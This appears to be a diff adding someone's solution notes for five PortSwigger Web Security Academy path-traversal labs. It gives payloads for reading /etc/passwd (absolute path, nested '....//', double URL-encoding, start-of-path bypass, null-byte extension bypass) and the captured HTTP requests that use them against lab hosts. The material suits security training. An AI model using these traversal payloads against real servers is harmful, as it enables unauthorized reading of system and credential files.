@@ -1,0 +1,114 @@
+1) Lab: File path traversal, traversal sequences blocked with absolute path bypass
+
+<img src="/image?filename=/etc/passwd">
+
+2) Lab: File path traversal, traversal sequences stripped non-recursively
+
+<img src="/image?filename=....//....//....//etc/passwd">
+
+3) Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+../ -> %2e%2e%2f -> %252e%252e%252f
+
+---
+
+GET /image?filename=23.jpg HTTP/2
+Host: 0a210070034561c78ac56d1e00600085.web-security-academy.net
+Cookie: session=RmXahx8XT1i13ILvKKd3tOJdb0tGyuTe
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a210070034561c78ac56d1e00600085.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
+---
+
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+->
+
+GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/2
+Host: 0a210070034561c78ac56d1e00600085.web-security-academy.net
+Cookie: session=RmXahx8XT1i13ILvKKd3tOJdb0tGyuTe
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a210070034561c78ac56d1e00600085.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
+4) Lab: File path traversal, validation of start of path
+
+filename=/var/www/images/../../../etc/passwd
+
+---
+
+GET /image?filename=/var/www/images/56.jpg HTTP/2
+Host: 0a94005303c0177e8185dfbf004e005d.web-security-academy.net
+Cookie: session=BHtCz7DLYbal9U43ihN38H16n23MUJ7m
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a94005303c0177e8185dfbf004e005d.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
+---
+
+GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+Host: 0a94005303c0177e8185dfbf004e005d.web-security-academy.net
+Cookie: session=BHtCz7DLYbal9U43ihN38H16n23MUJ7m
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a94005303c0177e8185dfbf004e005d.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
+5) Lab: File path traversal, validation of file extension with null byte bypass
+
+filename=../../../etc/passwd%00.png
+
+---
+
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+Host: 0aa8005504cc7a9a80f09e5700af00b1.web-security-academy.net
+Cookie: session=NoIFAsQ5et31wN4hJHAOXxXuSINQsnH4
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0aa8005504cc7a9a80f09e5700af00b1.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
